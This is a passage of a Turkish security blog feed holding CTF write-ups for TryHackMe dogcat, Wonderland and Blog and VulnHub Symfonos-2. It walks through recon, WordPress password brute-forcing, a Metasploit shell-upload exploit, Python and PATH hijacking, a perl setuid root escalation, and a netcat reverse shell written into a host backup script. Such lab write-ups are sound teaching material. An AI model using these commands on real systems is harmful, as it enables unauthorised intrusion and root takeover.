<p><strong>/opt</strong> dizini kontrol edildiğinde backups klasörü dikkat çekmektedir. Dizin içeriğine bakıldığında backup.sh adında shell script bulunmaktadır.</p>

    <img src="/images/thm/dogcat/backup.png"  alt="Hello Friend"  class="center"  style="border-radius: 5px;"  />


<p><em>/root/container</em> dizini ile container içerisinde yer alan <em>/opt/backup</em> dizininin volume oluşturularak bağlandığı görülmektedir. Dizindeki backup.sh dosyasına shell kodu eklenerek containerdan dışarı çıkılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.62.67 5555 &gt;/tmp/f&#34;</span> &gt;&gt; backup.sh
</code></pre></div><p>nc ile 5555 port dinlenir. backup.sh dosyası containerın çalıştığı host tarafından düzenli olarak çalıştırılmaktadır. (Öyle tahmin ederek bağlantı gelmesi beklenir 🤫)</p>

    <img src="/images/thm/dogcat/root2.png"  alt="Hello Friend"  class="center"  style="border-radius: 5px;"  />


<p>Kısa bir süre sonra ana makinadan shell bağlantısı alınır. Root dizini kontrol edilerek 4. flag dosyası okunur.</p>
<p>
    <img src="/images/thm/dogcat/rootdir.png"  alt="Hello Friend"  class="center"  style="border-radius: 5px;"  />


<br>

    <img src="/images/thm/dogcat/rootflagg.png"  alt="Hello Friend"  class="center"  style="border-radius: 5px;"  />

</p>
]]></content>
        </item>
        
        <item>
            <title>THM Wonderland Write Up</title>
            <link>https://barcode91.github.io/posts/2020/10/thm-wonderland-write-up/</link>
            <pubDate>Thu, 08 Oct 2020 12:39:20 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/10/thm-wonderland-write-up/</guid>
            <description>Merhaba, Bu yazımda sizlere Tryhackme&amp;rsquo;de yer alan orta seviye zorluktaki Wonderland adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip;
1. Keşif Aşaması Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.
sudo nmap -sV -sC 10.10.248.80  Sistemde sadece 2 port açıktır. Web sayfasına giriş yapılır.
Gobuster aracı ile dizin taraması yapılır. 3 adet dizin tespit edilir.
gobuster dir -u http://10.10.248.80/ -w /usr/share/wordlists/dirb/big.txt  /img dizine girilir. Dizindeki tüm resim dosyaları indirilir.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazımda sizlere Tryhackme&rsquo;de yer alan orta seviye zorluktaki <a href="https://tryhackme.com/room/wonderland">Wonderland</a> adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip;</p>
<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
<p>Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC 10.10.248.80
</code></pre></div>
    <img src="/images/thm/wonderland/nmap.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Sistemde sadece 2 port açıktır. Web sayfasına giriş yapılır.</p>

    <img src="/images/thm/wonderland/web1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Gobuster aracı ile dizin taraması yapılır. 3 adet dizin tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.248.80/ -w /usr/share/wordlists/dirb/big.txt 
</code></pre></div>
    <img src="/images/thm/wonderland/gobuster1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>/img dizine girilir. Dizindeki tüm resim dosyaları indirilir.</p>

    <img src="/images/thm/wonderland/img.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p><strong>steghide</strong> aracı ile resimler içerisine gizlenmiş olan dosyalar tespit edilir. Yapılan kontrolde white_rabbit.jpg dosyası içerisinde hint.txt adlı bir dosya gizlenmiştir.</p>

    <img src="/images/thm/wonderland/steg.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Dosya içeriğine bakıldığında tavşanı takip etmemiz söyleniyor. 🐇</p>

    <img src="/images/thm/wonderland/hint.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p><em><strong>/r</strong></em> dizin içeriği görüntülenir. Daha dizin içerisinde gobuster ile dizin taramasına devam edilir.</p>

    <img src="/images/thm/wonderland/r.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.248.80/r/ -w /usr/share/wordlists/dirb/big.txt
</code></pre></div>
    <img src="/images/thm/wonderland/gobuster2.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p><em><strong>/r</strong></em> dizini içerisinde <em><strong>/a</strong></em> dizini tespit edilir. İpucunda olan tavşan mevzusunun ne olduğu anlaşılır.💡Tarayıcından <em><strong>http://ipadresi/r/a/b/b/i/t</strong></em> adresine istek atılır.</p>

    <img src="/images/thm/wonderland/rabbit.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Sayfa kaynak kodları incelendiğinde gizli bir bilgi tespit edilmektedir.</p>

    <img src="/images/thm/wonderland/ssh.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
<p>Elde edilen bilgi herhangi bir login paneli tespit edilmediğinde ssh bağlantısı için kullanılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh alice@10.10.248.80
</code></pre></div>
    <img src="/images/thm/wonderland/ssh1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
<p><code>Sudo -l</code> ile kullanıcının yetkileri kontrol edilir. Rabbit kullanıcısı yetkisi ile <em>walrus_and_the_carpenter.py</em> dosyası çalıştırılmaktadır.</p>

    <img src="/images/thm/wonderland/sudo.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>walrus_and_the_carpenter.py içeriğine bakıldığında poem değişkeni içerisinde yer alan metinden rastgele belirlenen 10 satır ekrana basılmaktadır.</p>

    <img src="/images/thm/wonderland/py.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Rabbit kullanıcısına Hijacking Python Library tekniği ile geçilir. Aynı dizinde random.py adında dosya oluşturulur. İçerisine çalıştırmak istediğimiz kodlar yazılır. Uygulama çalıştığında random kütüphanesi import edilirken bizim yazdığımız kodlar import edilecektir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;/bin/bash)</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
</code></pre></div><p>Rabbit kullanısının home dizine geçilerek dosyalar listelenir. Suid biti aktif olan <em><strong>teaParty</strong></em> adında bir dosya görülmektedir.</p>

    <img src="/images/thm/wonderland/rabbito.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Dosya çalıştırıldığında Hatter&rsquo;ın partiye geleceği bilgisi ekrana basılmakta ve uygulama kullanıcıdan girdi beklemektedir. Herhangi bir tuşa basınca ekrana Segmentation Fault yazdırılmaktadır.</p>
<pre><code class="language-terminal" data-lang="terminal">rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Wed, 07 Oct 2020 20:06:29 +0000
Ask very nicely, and I will give you some tea while you wait for him
ls
Segmentation fault (core dumped)
</code></pre><p>Binary ayrıntılı incelenmek üzere locale indirilir. Daha sonra Ghidra ile analiz edilir.</p>

    <img src="/images/thm/wonderland/ghidra.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Setuid(0x3eb) ve setguid(0x3eb) ile uid değeri Hatter (1003) kullanıcısına set edilir. Burada dikkat çeken echo ve date komutlarının çalıştırılmasıdır. Echo komutu için tam yol belirtilirken, date komutu için path belirtilmemiştir. Date komutu PATH değişkeninde tanımalanan dizinlerde sıra ile aranmaktadır.</p>
<ol>
<li><em>Date dosyası oluşturulur.</em></li>
<li><em>Date dosya dizini PATH değişkenine eklenir.</em></li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rabbit@wonderland:/home/rabbit$ echo /bin/bash &gt; date
rabbit@wonderland:/home/rabbit$ chmod <span style="color:#ae81ff">777</span> date
rabbit@wonderland:/home/rabbit$ export PATH<span style="color:#f92672">=</span>/home/rabbit/:$PATH
</code></pre></div><p>Dosya çalıştırılarak <em><strong>hatter</strong></em> kullanıcısına geçiş yapılır. Hatter dizini içeriğine göz atılır.</p>

    <img src="/images/thm/wonderland/matter.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Password.txt dosyasında yer alan parola bilgisi ile hatter kullanıcısına geçiş yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh hatter@localhost
</code></pre></div><p>Hatter kullanıcısı yetkileri ile sistem hakkında bilgi toplamak için LinEnum betiği çalıştırılır. Betik çıktısında capability yetkileri olan dosyalar dikkat çekmektedir.</p>

    <img src="/images/thm/wonderland/cap.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Perl uygulamasının <em>setuid</em> ile yetkilerinin yükseltilerek kernele sistem çağırısı yapılabilceği tespit edilmektedir. <em><strong>uid değeri 0 (root)</strong></em> set edilir ve /bin/bash uygulaması çalıştırılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/usr/bin/perl -e <span style="color:#e6db74">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;/bin/sh&#34;;&#39;</span>
</code></pre></div>
    <img src="/images/thm/wonderland/priv.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p><em>/root</em> dizini içerisinde yer alan user.txt dosyası,</p>

    <img src="/images/thm/wonderland/userflag.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>ve <em>/home/alice</em> dizininde yer alan root.txt dosyaları okunarak makina çözümlemesi tamamlanır.</p>

    <img src="/images/thm/wonderland/rootflag.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>THM Blog Write Up</title>
            <link>https://barcode91.github.io/posts/2020/10/thm-blog-write-up/</link>
            <pubDate>Wed, 07 Oct 2020 11:49:09 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/10/thm-blog-write-up/</guid>
            <description>Merhaba, Bu yazımda sizlere Tryhackme&amp;rsquo;de yer alan orta seviye zorluktaki Blog adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip;
İlk olarak tasarımcı tarafından belirtilen domain adı /etc/hosts dosyasına eklenir.
1. Keşif Aşaması Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.
sudo nmap -sV -sC 10.10.25.92  Samba servisinde anonymous olarak paylaşıma açık olan dizinler kontrol edilir.
─[barcode@parrot]─[~]$ smbclient -L //10.10.25.92 Enter WORKGROUP\barcode&amp;#39;s password: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers BillySMB Disk Billy&amp;#39;s local SMB Share IPC$ IPC IPC Service (blog server (Samba, Ubuntu)) SMB1 disabled -- no workgroup available BillySMB klasörü içeriğine bakılır.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazımda sizlere Tryhackme&rsquo;de yer alan orta seviye zorluktaki <a href="https://tryhackme.com/room/blog">Blog</a> adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip;</p>
<p>İlk olarak tasarımcı tarafından belirtilen domain adı /etc/hosts dosyasına eklenir.</p>

    <img src="/images/thm/blog/desc.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
<p>Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC 10.10.25.92 
</code></pre></div>
    <img src="/images/thm/blog/nmap.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Samba servisinde anonymous olarak paylaşıma açık olan dizinler kontrol edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">─[barcode@parrot]─[~]$ smbclient -L //10.10.25.92
Enter WORKGROUP\barcode&#39;s password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	BillySMB        Disk      Billy&#39;s local SMB Share
	IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
</code></pre></div><p>BillySMB klasörü içeriğine bakılır. Paylaşıma açık olan dosyalar <strong>get</strong> komutu ile indirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">─[barcode@parrot]─[~]$ smbclient  //10.10.25.92/BillySMB
Enter WORKGROUP\barcode&#39;s password: 
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Tue May 26 13:17:05 2020
  ..                                  D        0  Tue May 26 12:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 13:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 13:13:45 2020
  check-this.png                      N     3082  Tue May 26 13:13:43 2020

		15413192 blocks of size 1024. 9788764 blocks available
smb: \&gt; get Alice-White-Rabbit.jpg 
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (30.9 KiloBytes/sec) (average 30.9 KiloBytes/sec)
smb: \&gt; get tswift.mp4 
getting file \tswift.mp4 of size 1236733 as tswift.mp4 (871.4 KiloBytes/sec) (average 508.1 KiloBytes/sec)
smb: \&gt; get check-this.png 
getting file \check-this.png of size 3082 as check-this.png (9.9 KiloBytes/sec) (average 453.0 KiloBytes/sec)
</code></pre></div><p><em>Alice-White-Rabbit.jpg</em> dosyasında gizli bir mesaj olduğu steghide aracı ile tespit edilir. Daha sonra yine aynı araç ile rabbit_hole.txt dosyası export edilir.</p>
<pre><code class="language-terminal" data-lang="terminal">─[barcode@parrot]─[~]$ steghide extract -sf Alice-White-Rabbit.jpg 
Enter passphrase: 
wrote extracted data to &quot;rabbit_hole.txt&quot;.
</code></pre><p>İçeriğine bakıldığında tuzak olduğu görülmektedir. 😥</p>
<pre><code class="language-terminal" data-lang="terminal">─[barcode@parrot]─[~]$ cat rabbit_hole.txt 
You've found yourself in a rabbit hole, friend.
</code></pre><p>Araştırmalara Web servisi üzerinden devam edilir. 80. portta Wordpress uygulaması çalışmaktadır.</p>

    <img src="/images/thm/blog/webpage.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Robots.txt dosyası içeriğine bakılır.</p>

    <img src="/images/thm/blog/robots.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Wordpress uygulamalarında kolaylıkla bilgi toplamamızı sağlayan wpscan aracı ile tarama yapılır. Tarama sonucunda dikkat çeken bilgiler aşağıdadır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wpscan --url http://blog.thm --enumerate
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">
[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%


[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, &lt;generator&gt;https://wordpress.org/?v=5.0&lt;/generator&gt;
 |  - http://blog.thm/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.0&lt;/generator&gt;

[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
</code></pre><p>Wordpress sürümü ile ilgili exploit araştırması yapıldığında düşük kullanıcı ile shell upload edilebilcek bir zafiyet tespit edilmektedir.</p>

    <img src="/images/thm/blog/exp.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Exploitin kullanımı için kullanıcı hesap bilgilerine ihtiyaç vardır. Wpscan aracı ile elde edilen hesaplara brute force saldırısı düzenlenir. İşlem soncunda kwhell adlı kullanıcıya ait parola elde edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wpscan --url http://blog.thm -U user.lst -P /usr/share/wordlists/rockyou.txt
</code></pre></div>
    <img src="/images/thm/blog/pass.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Metasploit aracı açılır ve tespit edilen exploit modulü aranır. Seçilen modüle ait ayarlar options komutu görüntülenir.</p>
<p><em>Not: Metasploit 6 sürümünde exploit işleminden sonra shell almada sıkıntılar olmaktadır.</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfconsole -q
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">msf5 &gt; search crop-image

Matching Modules
================

   #  Name                            Disclosure Date  Rank       Check  Description
   -  ----                            ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload


msf5 &gt; use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf5 exploit(multi/http/wp_crop_rce) &gt; options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress

</code></pre></div><p>Exploitin kullanımı için zorunlu parametlere set edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">&gt; set password *********
&gt; set username kwheel
&gt; set rhosts 10.10.25.92
&gt; set lhost 10.9.62.67
</code></pre></div><h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
<p>Run/Exploit komutu ile meterpreter oturumu elde edilmiş olur.</p>
<p><em>/home/bjoel</em> dizin içeriği kontrol edildiğinde user.txt dosyası görülmektedir.</p>

    <img src="/images/thm/blog/home.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>İçerik görüntülendiğinde tam bir hayal kırılığıdır. 😭</p>

    <img src="/images/thm/blog/fake.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p><code>shell</code> komutu ile meterpreter oturumdan normal terminal oturumuna geçilir. Sistem genelinde user.txt araması yapıldığında başka dosya bulunamaz. User.txt dosyası yüksek kullanıcı erişimine sahip bir dizin içerisinde yer almaktadır.</p>
<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
<p>Yetki yükseltmek için suid biti aktif dosyalar tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
</code></pre></div>
    <img src="/images/thm/blog/suid.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p><em><strong>/usr/sbin/checker</strong></em> uygulaması dikkat çekmektedir. Uygulama çalıştırıldığında <mark>Not an Admin </mark> hatası vermektedir. Uygulamanın işleyişinin daha iyi anlaşılabilmesi için uygulama home dizinine kopyalanır ve tersine mühendislik araçları ile incelenmek üzere locale indirilir.</p>
<blockquote>
<p>Not: Home dizininde <code>python2 -m SimpleHTTPServer 8000</code> komutu çalıştılır. İster tarayıcıdan ister curl, wget gibi araçlarla dosya indirilebilir.</p>
</blockquote>
<p>Ghridra ile binary analiz edilir. <em><strong>getenv(&ldquo;parametre&rdquo;)</strong></em> fonksiyonu parametre aldığı değeri ortam değişkenleri içerisinde arar varsa değerini döndürür. <em>Admin değişkeni varsa uid değeri 0 (root) olarak set edilir ve /bin/bash başlatılır.</em></p>

    <img src="/images/thm/blog/ghidra.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Burada <em>admin</em> değeri ortam değişkeninleri içerisinde aranmaktadır. Bypass için <code>export</code> komutu ile admin değişkeni tanımlanır ve rastgele bir değer atanır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">export admin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;</span>
</code></pre></div><p><em>/usr/sbin/checker</em> uygulaması çalıştırıldığında root yetkisi ile shell oturumu elde edilir.</p>
<pre><code class="language-terminal" data-lang="terminal">/usr/sbin/checker
id
uid=0(root) gid=33(www-data) groups=33(www-data)
</code></pre><p>Root dizini altında yer alan root.txt okunur.</p>

    <img src="/images/thm/blog/root.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>User.txt için <code>find</code> komutu ile arama yapıldığında /media/usb/ dizini altında bulunur.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find -name <span style="color:#e6db74">&#39;user.txt&#39;</span> 2&gt;/dev/null
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">/home/bjoel/user.txt
/media/usb/user.txt
</code></pre>
    <img src="/images/thm/blog/user.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>VULNHUB Symfonos-2 Write Up</title>
            <link>https://barcode91.github.io/posts/2020/10/vulnhub-symfonos-2-write-up/</link>
            <pubDate>Tue, 06 Oct 2020 11:25:38 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/10/vulnhub-symfonos-2-write-up/</guid>
            <description>Merhaba, Bu yazımda sizlere VULNHUB &amp;lsquo;da yer alan Symfonos serisinin OSCP tadında olan 2. makinasının çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip;
1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
netdiscover -i eth1  Her zaman olduğu gibi nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/symfonos-2,331/">VULNHUB</a> &lsquo;da yer alan Symfonos serisinin OSCP tadında olan 2. makinasının çözümünden bahsedeceğim. Keyifli okumalar&hellip;</p>
<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
<p>Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
</code></pre></div>
    <img src="/images/vulnhub/symfonos2/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Her zaman olduğu gibi nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.115
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 06:48 CDT
Nmap scan report for 192.168.56.115 (192.168.56.115)
Host is up (0.00012s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:FD:79:D9 (Oracle VirtualBox virtual NIC)
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 4h39m59s, deviation: 2h53m12s, median: 2h59m59s
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2020-10-05T09:48:38-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-10-05T14:48:38
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds
</code></pre><p>İlk göze çarpan 139 ve 445 numaralı portlarda çalışan Samba ve 21 numaralı portta çalışan ftp servisidir.</p>
<p>Samba servisinde paylaşıma açık olan dosya ve klasörler <em>smbclient</em> ile kontrol edilir. Paylaşıma açık olan dizin içeriği kontrol edilir. log.txt dosyası indirilir ve incelenir.</p>
<pre><code class="language-terminal" data-lang="terminal">smbclient  -L //192.168.56.115/
smbclient  //192.168.56.114/anonymous
</code></pre>
    <img src="/images/vulnhub/symfonos2/smb.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Log.txt dosyasında 2 adet önemli bilgi yer almaktadır.</p>
<ol>
<li>shadow dosyasının yedeklendiği dizin</li>
</ol>

    <img src="/images/vulnhub/symfonos2/info1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<ol start="2">
<li>Samba ile paylaşıma açılan dizin yolu</li>
</ol>

    <img src="/images/vulnhub/symfonos2/info2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>ProFTPD 1.3.5 sürümünde <em>CVE:2015-3306</em> kodu ile login olmadan dosya kopyalama zafiyeti bulunmaktadır.</p>

    <img src="/images/vulnhub/symfonos2/ftpexp.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


